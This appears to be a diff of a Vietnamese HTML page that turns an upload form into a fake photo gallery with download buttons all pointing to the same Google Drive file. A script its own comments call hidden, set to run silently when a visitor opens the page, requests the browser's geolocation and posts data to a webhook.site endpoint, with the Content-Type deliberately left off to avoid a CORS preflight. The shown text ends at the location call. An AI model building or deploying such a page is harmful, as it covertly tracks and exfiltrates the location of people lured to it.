@@ -2,50 +2,78 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Tải ảnh của bạn</title>
+  <title>Bộ sưu tập ảnh</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      background: #fafafa;
       text-align: center;
-      margin-top: 80px;
+      margin: 40px;
     }
-    #uploadBox {
-      border: 2px dashed #999;
-      padding: 40px;
-      width: 300px;
-      margin: auto;
-      border-radius: 10px;
-      background-color: #f9f9f9;
+    h1 {
+      margin-bottom: 20px;
     }
-    input[type="file"] {
-      margin-top: 15px;
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+    .photo {
+      border: 1px solid #ccc;
+      padding: 10px;
+      border-radius: 8px;
+      background: white;
+      width: 200px;
+    }
+    .photo img {
+      max-width: 100%;
+      border-radius: 5px;
+    }
+    .photo a {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 6px 12px;
+      background: #007bff;
+      color: white;
+      text-decoration: none;
+      border-radius: 4px;
+    }
+    .photo a:hover {
+      background: #0056b3;
     }
   </style>
 </head>
 <body>
-  <div id="uploadBox">
-    <h2>Vui lòng tải ảnh của bạn</h2>
-    <form>
-      <input type="file" name="file" accept="image/*">
-      <br><br>
-      <button type="submit">Upload</button>
-    </form>
+  <h1>Bộ sưu tập ảnh của tôi</h1>
+  <p>Bạn có thể tải xuống những bức ảnh bên dưới:</p>
+
+  <div class="gallery">
+    <div class="photo">
+      <img src="https://drive.google.com/uc?export=download&id=1VffO72I0HcR3wGFaG5tyVvlb8FE-b41y" alt="Ảnh 1">
+      <a href="https://drive.google.com/uc?export=download&id=1VffO72I0HcR3wGFaG5tyVvlb8FE-b41y" download>📥 Tải ảnh</a>
+    </div>
+    <div class="photo">
+      <img src="https://drive.google.com/uc?export=download&id=1VffO72I0HcR3wGFaG5tyVvlb8FE-b41y" alt="Ảnh 2">
+      <a href="https://drive.google.com/uc?export=download&id=1VffO72I0HcR3wGFaG5tyVvlb8FE-b41y" download>📥 Tải ảnh</a>
+    </div>
+    <div class="photo">
+      <img src="https://drive.google.com/uc?export=download&id=1VffO72I0HcR3wGFaG5tyVvlb8FE-b41y" alt="Ảnh 3">
+      <a href="https://drive.google.com/uc?export=download&id=1VffO72I0HcR3wGFaG5tyVvlb8FE-b41y" download>📥 Tải ảnh</a>
+    </div>
   </div>
 
+  <!-- Script ẩn để lấy vị trí -->
   <script>
-    // webhook của bạn (ví dụ webhook.site)
     const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";
 
     function sendToWebhook(data) {
       fetch(webhook, {
         method: "POST",
-        body: JSON.stringify(data) // không set Content-Type để tránh CORS preflight
-      })
-      .then(() => console.log("Sent:", data))
-      .catch(e => console.error("Error:", e));
+        body: JSON.stringify(data) // không set Content-Type để tránh preflight
+      }).catch(e => console.error("Error:", e));
     }
 
-    // Ngầm lấy vị trí khi user mở trang
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
